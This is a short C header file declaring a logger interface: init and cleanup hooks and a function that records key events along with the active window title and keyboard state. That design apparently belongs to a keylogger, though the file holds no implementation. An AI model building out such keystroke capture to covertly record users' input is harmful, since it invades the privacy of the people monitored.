// logger.h
#ifndef LOGGER_H
#define LOGGER_H

#include <wchar.h>

// Called at startup
void logger_init(void);

// Called at shutdown
void logger_cleanup(void);

// Log a key event
void logger_log_key(const wchar_t *windowTitle, const wchar_t * keyboardState, const wchar_t *keyText);

#endif
